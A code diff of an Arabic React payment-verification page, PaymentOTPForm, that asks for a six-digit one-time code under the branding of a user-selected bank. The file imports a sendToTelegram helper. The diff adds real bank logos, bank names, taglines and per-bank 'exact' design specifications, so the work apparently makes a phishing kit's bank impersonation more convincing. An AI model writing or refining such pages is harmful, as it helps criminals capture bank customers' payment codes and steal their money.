@@ -9,6 +9,7 @@ import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getBankDesign, getDefaultBankDesign } from "@/lib/bankDesigns";
+import { getBankAssets } from "@/lib/bankAssets";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -37,8 +38,9 @@ const PaymentOTPForm = () => {
   const selectedBankId = sessionStorage.getItem('selectedBank') || '';
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   
-  // Get bank design specification
-  const bankDesign = selectedBankId ? getBankDesign(selectedBankId) || getDefaultBankDesign() : getDefaultBankDesign();
+  // Get bank design specification (always returns a complete design)
+  const bankDesign = selectedBankId ? getBankDesign(selectedBankId) : getDefaultBankDesign();
+  const bankAssets = getBankAssets(selectedBankId);
   
   // Demo OTP: 123456
   const DEMO_OTP = "123456";
@@ -236,34 +238,17 @@ const PaymentOTPForm = () => {
   };
   
   const isOtpComplete = otp.every(digit => digit !== "");
-  const hasAnyDigit = otp.some(digit => digit !== "");
   
-  // Get card style classes
-  const getCardClasses = () => {
-    const baseClasses = "w-full";
-    const radiusClass = `rounded-${bankDesign.borderRadius?.replace('px', '') || 'lg'}`;
-    
-    switch (bankDesign.cardStyle) {
-      case 'elevated':
-        return `${baseClasses} ${radiusClass} shadow-2xl`;
-      case 'flat':
-        return `${baseClasses} ${radiusClass} shadow-sm`;
-      case 'outlined':
-        return `${baseClasses} ${radiusClass} border-2`;
-      case 'gradient':
-        return `${baseClasses} ${radiusClass} shadow-lg`;
-      default:
-        return `${baseClasses} ${radiusClass} shadow-lg`;
-    }
-  };
-  
-  // Get button style
-  const getButtonStyles = () => {
+  // Get button style with exact specifications
+  const getButtonStyles = (): React.CSSProperties => {
     const baseStyle: React.CSSProperties = {
       borderRadius: bankDesign.buttonRadius || '8px',
       color: '#FFFFFF',
       fontWeight: bankDesign.fontWeight || '500',
+      fontSize: bankDesign.buttonFontSize || bankDesign.fontSize?.body || '16px',
+      padding: bankDesign.buttonPadding || bankDesign.padding?.button || '14px 24px',
       transition: 'all 0.3s ease',
+      width: '100%',
     };
     
     switch (bankDesign.buttonStyle) {
@@ -272,14 +257,14 @@ const PaymentOTPForm = () => {
           ...baseStyle,
           background: `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`,
           border: 'none',
-          boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
+          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
         };
       case 'solid':
         return {
           ...baseStyle,
           background: bankDesign.primaryColor,
           border: 'none',
-          boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
+          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
         };
       case 'outline':
         return {
@@ -293,22 +278,86 @@ const PaymentOTPForm = () => {
           ...baseStyle,
           background: bankDesign.primaryColor,
           border: 'none',
-          boxShadow: `0 8px 16px ${bankDesign.primaryColor}40`,
+          boxShadow: bankDesign.shadow?.button || `0 8px 16px ${bankDesign.primaryColor}40`,
         };
       default:
         return baseStyle;
     }
   };
   
+  // Get input style for OTP boxes
+  const getOTPInputStyle = (hasValue: boolean): React.CSSProperties => {
+    return {
+      width: '56px',
+      height: '64px',
+      textAlign: 'center',
+      fontSize: '28px',
+      fontWeight: 'bold',
+      border: `2px solid ${hasValue ? bankDesign.primaryColor : (bankDesign.borderColor || bankDesign.primaryColor + '40')}`,
+      borderRadius: bankDesign.inputRadius || '12px',
+      backgroundColor: hasValue ? bankDesign.primaryColor + '08' : bankDesign.surfaceColor,
+      color: bankDesign.textColor,
+      transition: 'all 0.2s ease',
+    };
+  };
+  
   // Layout container style
   const getLayoutContainerStyle = (): React.CSSProperties => {
-    return {
+    const baseStyle: React.CSSProperties = {
       fontFamily: bankDesign.fontFamilyArabic || bankDesign.fontFamily || 'Tajawal, sans-serif',
       backgroundColor: bankDesign.backgroundColor,
       color: bankDesign.textColor,
       minHeight: '100vh',
       direction: 'rtl',
     };
+    
+    switch (bankDesign.backgroundPattern) {
+      case 'gradient':
+        return {
+          ...baseStyle,
+          background: `linear-gradient(135deg, ${bankDesign.backgroundColor} 0%, ${bankDesign.surfaceColor} 100%)`,
+        };
+      default:
+        return baseStyle;
+    }
+  };
+  
+  // Get card style
+  const getCardStyle = (): React.CSSProperties => {
+    const baseStyle: React.CSSProperties = {
+      backgroundColor: bankDesign.surfaceColor,
+      borderRadius: bankDesign.borderRadius || '12px',
+      padding: bankDesign.padding?.card || '32px',
+      width: '100%',
+    };
+    
+    switch (bankDesign.cardStyle) {
+      case 'elevated':
+        return {
+          ...baseStyle,
+          boxShadow: bankDesign.shadow?.card || '0 4px 16px rgba(0, 0, 0, 0.1)',
+        };
+      case 'flat':
+        return {
+          ...baseStyle,
+          boxShadow: 'none',
+          border: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
+        };
+      case 'outlined':
+        return {
+          ...baseStyle,
+          border: `2px solid ${bankDesign.borderColor || bankDesign.primaryColor}`,
+          boxShadow: 'none',
+        };
+      case 'gradient':
+        return {
+          ...baseStyle,
+          background: `linear-gradient(135deg, ${bankDesign.surfaceColor} 0%, ${bankDesign.backgroundColor} 100%)`,
+          boxShadow: bankDesign.shadow?.card || '0 4px 16px rgba(0, 0, 0, 0.1)',
+        };
+      default:
+        return baseStyle;
+    }
   };
   
   // Format time
@@ -317,6 +366,8 @@ const PaymentOTPForm = () => {
     const secs = seconds % 60;
     return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
+  
+  const spacing = bankDesign.spacing || { small: '8px', medium: '16px', large: '24px', xlarge: '32px' };
   
   return (
     <div style={getLayoutContainerStyle()}>
@@ -332,15 +383,19 @@ const PaymentOTPForm = () => {
             backgroundImage: `url(${bankDesign.backgroundImage})`,
             backgroundSize: 'cover',
             backgroundPosition: 'center',
-            opacity: 0.05,
+            opacity: 0.03,
             zIndex: 0,
           }}
         />
       )}
       
       <div
-        className="flex items-center justify-center min-h-screen px-4 py-8"
-        style={{ position: 'relative', zIndex: 1 }}
+        className="flex items-center justify-center min-h-screen"
+        style={{
+          padding: bankDesign.padding?.container || '24px',
+          position: 'relative',
+          zIndex: 1,
+        }}
       >
         <div
           style={{
@@ -349,81 +404,113 @@ const PaymentOTPForm = () => {
           }}
         >
           {/* Bank Header */}
-          {selectedBank && bankDesign.headerStyle !== 'minimal' && (
+          {bankDesign.showLogo && selectedBank && bankDesign.headerStyle !== 'minimal' && (
             <div
-              className="mb-6"
               style={{
                 textAlign: 'center',
-                marginBottom: bankDesign.headerStyle === 'prominent' ? '32px' : '24px',
+                marginBottom: spacing.large,
               }}
             >
-              <div
-                style={{
-                  background: bankDesign.buttonStyle === 'gradient'
-                    ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
-                    : bankDesign.primaryColor,
-                  borderRadius: bankDesign.borderRadius || '12px',
-                  padding: bankDesign.headerStyle === 'prominent' ? '24px' : '16px',
-                  color: '#FFFFFF',
-                  marginBottom: '24px',
-                  boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
-                }}
-              >
-                <div className="flex items-center justify-center gap-3">
-                  <Shield className="w-8 h-8" />
-                  <div>
-                    <h1 style={{ fontSize: '20px', fontWeight: '600', margin: 0 }}>
-                      {selectedBank.nameAr}
-                    </h1>
-                    <p style={{ fontSize: '14px', opacity: 0.9, margin: 0 }}>
-                      {selectedBank.name}
-                    </p>
-                  </div>
+              {bankAssets?.logo ? (
+                <img 
+                  src={bankAssets.logo} 
+                  alt={selectedBank?.name || ''}
+                  style={{
+                    width: bankDesign.logoSize || '160px',
+                    height: 'auto',
+                    marginBottom: spacing.medium,
+                  }}
+                  onError={(e) => {
+                    e.currentTarget.style.display = 'none';
+                  }}
+                />
+              ) : (
+                <div
+                  style={{
+                    width: bankDesign.logoSize || '160px',
+                    height: bankDesign.logoSize || '160px',
+                    borderRadius: bankDesign.buttonRadius || '8px',
+                    background: bankDesign.buttonStyle === 'gradient'
+                      ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
+                      : bankDesign.primaryColor,
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    color: '#FFFFFF',
+                    margin: '0 auto',
+                    marginBottom: spacing.medium,
+                  }}
+                >
+                  <Shield style={{ width: '40%', height: '40%' }} />
                 </div>
-              </div>
+              )}
+              
+              {bankDesign.headerStyle === 'prominent' && (
+                <div
+                  style={{
+                    background: bankDesign.buttonStyle === 'gradient'
+                      ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
+                      : bankDesign.primaryColor,
+                    borderRadius: bankDesign.borderRadius || '12px',
+                    padding: spacing.medium,
+                    color: '#FFFFFF',
+                    marginBottom: spacing.medium,
+                  }}
+                >
+                  <h1 style={{ 
+                    fontSize: bankDesign.fontSize?.h2 || '24px', 
+                    fontWeight: bankDesign.fontWeight || '600', 
+                    margin: 0,
+                    marginBottom: spacing.small,
+                  }}>
+                    {selectedBank.nameAr}
+                  </h1>
+                  {bankDesign.showTagline && bankDesign.taglineAr && (
+                    <p style={{ 
+                      fontSize: bankDesign.fontSize?.small || '14px', 
+                      opacity: 0.9, 
+                      margin: 0,
+                    }}>
+                      {bankDesign.taglineAr}
+                    </p>
+                  )}
+                </div>
+              )}
             </div>
           )}
           
           {/* OTP Card */}
-          <div
-            className={getCardClasses()}
-            style={{
-              backgroundColor: bankDesign.surfaceColor,
-              borderColor: bankDesign.borderColor || bankDesign.primaryColor + '20',
-              padding: '32px',
-            }}
-          >
+          <div style={getCardStyle()}>
             {/* Title Section */}
-            <div style={{ textAlign: 'center', marginBottom: '32px' }}>
+            <div style={{ textAlign: 'center', marginBottom: spacing.xlarge }}>
               <div
                 style={{
                   width: '80px',
                   height: '80px',
                   borderRadius: bankDesign.buttonRadius === '0px' ? '0' : '50%',
-                  margin: '0 auto 20px',
+                  margin: '0 auto ' + spacing.large,
                   background: bankDesign.buttonStyle === 'gradient'
                     ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
                     : bankDesign.primaryColor,
                   display: 'flex',
                   alignItems: 'center',
                   justifyContent: 'center',
-                  boxShadow: `0 4px 12px ${bankDesign.primaryColor}30`,
-                  animation: 'pulse 2s infinite',
+                  boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
                 }}
               >
-                <Shield className="w-10 h-10 text-white" />
+                <Shield style={{ width: '40px', height: '40px', color: '#FFFFFF' }} />
               </div>
               <h1 style={{ 
-                fontSize: '28px', 
-                fontWeight: '600', 
+                fontSize: bankDesign.fontSize?.h1 || '32px', 
+                fontWeight: bankDesign.fontWeight || '600', 
                 color: bankDesign.textColor, 
-                marginBottom: '8px',
+                marginBottom: spacing.small,
                 margin: 0,
               }}>
                 رمز التحقق
               </h1>
               <p style={{ 
-                fontSize: '16px', 
+                fontSize: bankDesign.fontSize?.body || '16px', 
                 color: bankDesign.textSecondaryColor || bankDesign.textColor,
                 opacity: 0.7,
                 margin: 0,
@@ -438,13 +525,13 @@ const PaymentOTPForm = () => {
                 background: bankDesign.primaryColor + '10',
                 border: `1px solid ${bankDesign.primaryColor}30`,
                 borderRadius: bankDesign.borderRadius || '12px',
-                padding: '16px',
-                marginBottom: '32px',
+                padding: spacing.medium,
+                marginBottom: spacing.large,
                 textAlign: 'center',
               }}
             >
               <p style={{ 
-                fontSize: '14px',
+                fontSize: bankDesign.fontSize?.small || '14px',
                 color: bankDesign.textColor,
                 margin: 0,
               }}>
@@ -454,14 +541,14 @@ const PaymentOTPForm = () => {
             
             <form onSubmit={handleSubmit}>
               {/* OTP Input - 6 digits */}
-              <div style={{ marginBottom: '24px' }}>
+              <div style={{ marginBottom: spacing.large }}>
                 <div
                   style={{
                     display: 'flex',
-                    gap: '12px',
+                    gap: spacing.small,
                     justifyContent: 'center',
                     alignItems: 'center',
-                    marginBottom: '16px',
+                    marginBottom: spacing.medium,
                     direction: 'ltr',
                   }}
                 >
@@ -477,21 +564,10 @@ const PaymentOTPForm = () => {
                       onChange={(e) => handleChange(index, e.target.value)}
                       onKeyDown={(e) => handleKeyDown(index, e)}
                       onPaste={handlePaste}
-                      style={{
-                        width: '56px',
-                        height: '64px',
-                        textAlign: 'center',
-                        fontSize: '28px',
-                        fontWeight: 'bold',
-                        border: `2px solid ${digit ? bankDesign.primaryColor : (bankDesign.borderColor || bankDesign.primaryColor + '40')}`,
-                        borderRadius: bankDesign.inputRadius || '12px',
-                        backgroundColor: digit ? bankDesign.primaryColor + '08' : bankDesign.surfaceColor,
-                        color: bankDesign.textColor,
-                        transition: 'all 0.2s ease',
-                      }}
+                      style={getOTPInputStyle(!!digit)}
                       onFocus={(e) => {
                         e.target.style.borderColor = bankDesign.primaryColor;
-                        e.target.style.boxShadow = `0 0 0 3px ${bankDesign.primaryColor}20`;
+                        e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
                       }}
                       onBlur={(e) => {
                         e.target.style.borderColor = digit ? bankDesign.primaryColor : (bankDesign.borderColor || bankDesign.primaryColor + '40');
@@ -508,38 +584,50 @@ const PaymentOTPForm = () => {
               {error && (
                 <div
                   style={{
-                    background: '#FEE2E2',
-                    border: '1px solid #FCA5A5',
+                    background: (bankDesign.errorColor || '#DC2626') + '10',
+                    border: `1px solid ${bankDesign.errorColor || '#DC2626'}30`,
                     borderRadius: bankDesign.borderRadius || '12px',
-                    padding: '12px 16px',
-                    marginBottom: '20px',
+                    padding: spacing.medium,
+                    marginBottom: spacing.large,
                     display: 'flex',
                     alignItems: 'start',
-                    gap: '12px',
+                    gap: spacing.small,
                   }}
                 >
-                  <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0" />
-                  <p style={{ fontSize: '14px', color: '#DC2626', margin: 0 }}>{error}</p>
+                  <AlertCircle style={{ 
+                    width: '20px', 
+                    height: '20px', 
+                    color: bankDesign.errorColor || '#DC2626',
+                    flexShrink: 0,
+                    marginTop: '2px',
+                  }} />
+                  <p style={{ 
+                    fontSize: bankDesign.fontSize?.small || '14px', 
+                    color: bankDesign.errorColor || '#DC2626', 
+                    margin: 0,
+                  }}>
+                    {error}
+                  </p>
                 </div>
               )}
               
               {/* Countdown Timer */}
               {countdown > 0 && (
-                <div style={{ textAlign: 'center', marginBottom: '20px' }}>
+                <div style={{ textAlign: 'center', marginBottom: spacing.medium }}>
                   <div
                     style={{
                       display: 'inline-flex',
                       alignItems: 'center',
-                      gap: '8px',
+                      gap: spacing.small,
                       background: bankDesign.primaryColor + '15',
                       color: bankDesign.primaryColor,
-                      padding: '8px 16px',
+                      padding: spacing.small + ' ' + spacing.medium,
                       borderRadius: bankDesign.borderRadius || '12px',
-                      fontSize: '14px',
+                      fontSize: bankDesign.fontSize?.small || '14px',
                       fontWeight: '500',
                     }}
                   >
-                    <Clock className="w-4 h-4" />
+                    <Clock style={{ width: '16px', height: '16px' }} />
                     <span>إعادة إرسال الرمز بعد {formatTime(countdown)}</span>
                   </div>
                 </div>
@@ -547,9 +635,9 @@ const PaymentOTPForm = () => {
               
               {/* Attempts Counter */}
               {attempts > 0 && attempts < 3 && (
-                <div style={{ textAlign: 'center', marginBottom: '20px' }}>
+                <div style={{ textAlign: 'center', marginBottom: spacing.medium }}>
                   <p style={{ 
-                    fontSize: '14px',
+                    fontSize: bankDesign.fontSize?.small || '14px',
                     color: '#F59E0B',
                     margin: 0,
                   }}>
@@ -563,9 +651,6 @@ const PaymentOTPForm = () => {
                 type="submit"
                 style={{
                   ...getButtonStyles(),
-                  width: '100%',
-                  padding: '14px 24px',
-                  fontSize: '16px',
                   cursor: (attempts >= 3 || !isOtpComplete) ? 'not-allowed' : 'pointer',
                   opacity: (attempts >= 3 || !isOtpComplete) ? 0.6 : 1,
                 }}
@@ -576,7 +661,7 @@ const PaymentOTPForm = () => {
                 ) : (
                   <>
                     <span className="ml-2">تأكيد الدفع</span>
-                    <ArrowLeft className="w-4 h-4 mr-2" />
+                    <ArrowLeft style={{ width: '16px', height: '16px', marginRight: '8px' }} />
                   </>
                 )}
               </Button>
@@ -587,13 +672,13 @@ const PaymentOTPForm = () => {
                   type="button"
                   style={{
                     width: '100%',
-                    marginTop: '12px',
+                    marginTop: spacing.medium,
                     background: 'transparent',
                     border: `1px solid ${bankDesign.primaryColor}`,
                     color: bankDesign.primaryColor,
                     borderRadius: bankDesign.buttonRadius || '8px',
-                    padding: '12px 24px',
-                    fontSize: '14px',
+                    padding: spacing.medium,
+                    fontSize: bankDesign.fontSize?.small || '14px',
                     cursor: 'pointer',
                   }}
                   onClick={() => {
@@ -612,8 +697,8 @@ const PaymentOTPForm = () => {
             {/* Demo Info */}
             <div
               style={{
-                marginTop: '24px',
-                padding: '12px',
+                marginTop: spacing.large,
+                padding: spacing.medium,
                 background: bankDesign.surfaceColor,
                 border: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
                 borderRadius: bankDesign.borderRadius || '12px',
@@ -621,7 +706,7 @@ const PaymentOTPForm = () => {
               }}
             >
               <p style={{ 
-                fontSize: '12px',
+                fontSize: bankDesign.fontSize?.small || '14px',
                 color: bankDesign.textSecondaryColor || bankDesign.textColor,
                 opacity: 0.7,
                 margin: 0,
@@ -656,6 +741,11 @@ const PaymentOTPForm = () => {
           }
         }
       `}</style>
+      
+      {/* Custom CSS if provided */}
+      {bankDesign.customCSS && (
+        <style dangerouslySetInnerHTML={{ __html: bankDesign.customCSS }} />
+      )}
     </div>
   );
 };
